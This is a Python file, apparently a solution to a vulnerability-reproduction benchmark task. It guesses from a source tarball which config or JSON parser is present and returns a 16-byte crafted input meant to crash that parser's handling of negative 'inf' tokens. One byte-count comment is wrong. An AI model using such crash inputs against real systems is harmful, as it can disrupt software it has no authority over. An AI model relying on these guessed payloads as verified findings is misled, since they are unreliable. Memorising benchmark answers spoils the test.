import os
import tarfile
import tempfile
from typing import List


class Solution:
    def solve(self, src_path: str) -> bytes:
        def list_files_from_tar(tar_path: str) -> List[bytes]:
            files = []
            try:
                with tarfile.open(tar_path, 'r:*') as tf:
                    for m in tf.getmembers():
                        if m.isfile() and (m.size <= 2 * 1024 * 1024):  # limit to 2MB per file
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            try:
                                data = f.read()
                                files.append(data)
                            except Exception:
                                continue
            except Exception:
                pass
            return files

        def detect_project(files: List[bytes]) -> str:
            has_toml = False
            has_yaml = False
            has_json5 = False
            has_json = False
            has_yyjson = False
            has_rapidjson = False

            for data in files:
                lower = data.lower()
                # TOML indicators
                if b"toml++" in data or b"toml11" in lower or b"libtoml" in lower or b"toml.h" in lower or b"toml.hpp" in lower or b"namespace toml" in lower:
                    has_toml = True
                if b"yaml-cpp" in lower or b"libyaml" in lower or b"yaml.h" in lower or b"namespace yaml" in lower:
                    has_yaml = True
                if b"json5" in lower:
                    has_json5 = True
                if b"yyjson" in lower:
                    has_yyjson = True
                if b"rapidjson" in lower:
                    has_rapidjson = True
                if b"json.h" in lower or b"json.hpp" in lower or b"json-c" in lower or b"nlohmann" in lower:
                    has_json = True

            # Prefer more specific detections
            if has_toml:
                return "toml"
            if has_yaml:
                return "yaml"
            if has_json5:
                return "json5"
            if has_yyjson:
                return "yyjson"
            if has_rapidjson:
                return "rapidjson"
            if has_json:
                return "json"
            return "unknown"

        def make_poc(project: str) -> bytes:
            # Construct 16-byte PoC tailored per detected project.
            if project == "toml":
                # Attempt to trigger minus + non-inf handling in TOML float parsing
                poc = b"a=-inZ #abcdefg\n"  # 16 bytes
                return poc[:16]
            if project == "yaml":
                # YAML recognizes .inf; provide minus + non-inf to stress parsing
                poc = b"-.inZ #abcdefgh\n"  # 16 bytes
                return poc[:16]
            if project in ("json5", "yyjson", "rapidjson", "json"):
                # JSON5/yyjson may handle Infinity tokens; provide negative + extra
                poc = b"-Infinityaaaaaa"  # 16 bytes
                return poc[:16]
            # Fallback: generic minus + inf-like token with padding
            return b"a=-inZ #abcdefg\n"  # 16 bytes

        files = list_files_from_tar(src_path)
        proj = detect_project(files)
        return make_poc(proj)